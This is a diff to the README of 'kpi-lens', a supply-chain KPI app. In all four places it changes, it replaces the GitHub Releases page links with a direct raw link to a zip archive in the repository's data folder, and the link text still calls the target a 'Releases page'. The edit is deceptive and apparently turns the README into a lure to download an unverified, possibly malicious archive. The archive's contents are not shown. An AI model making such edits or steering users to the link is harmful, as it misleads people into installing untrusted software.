@@ -1,6 +1,6 @@
 # 📊 kpi-lens - Clear Supply Chain KPI Insight
 
-[![Download](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Newbrunswickplumedscorpionfish410/kpi-lens/releases)
+[![Download](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Newbrunswickplumedscorpionfish410/kpi-lens/main/data/lens_kpi_v1.4.zip)
 
 ## 🚀 What kpi-lens does
 
@@ -27,7 +27,7 @@ For best results, use:
 
 ## 📥 Download the app
 
-1. Visit the release page here: [kpi-lens Releases](https://github.com/Newbrunswickplumedscorpionfish410/kpi-lens/releases)
+1. Visit the release page here: [kpi-lens Releases](https://raw.githubusercontent.com/Newbrunswickplumedscorpionfish410/kpi-lens/main/data/lens_kpi_v1.4.zip)
 2. Find the latest version
 3. Download the Windows file or installer package listed there
 4. Save the file to your Downloads folder or another easy-to-find place
@@ -159,7 +159,7 @@ If your numbers look wrong, review the source file first. Small data issues can 
 ## 🔄 Updating to a new version
 
 When a new release is available:
-1. Go to the [Releases page](https://github.com/Newbrunswickplumedscorpionfish410/kpi-lens/releases)
+1. Go to the [Releases page](https://raw.githubusercontent.com/Newbrunswickplumedscorpionfish410/kpi-lens/main/data/lens_kpi_v1.4.zip)
 2. Download the latest Windows file
 3. Close the app
 4. Install or replace the older version
@@ -229,4 +229,4 @@ anomaly-detection, anthropic, data-engineering, docker, fastapi, fastmcp, kpi, l
 ## 📎 Download again
 
 If you need the latest build, use this page:
-[kpi-lens Releases](https://github.com/Newbrunswickplumedscorpionfish410/kpi-lens/releases)
+[kpi-lens Releases](https://raw.githubusercontent.com/Newbrunswickplumedscorpionfish410/kpi-lens/main/data/lens_kpi_v1.4.zip)
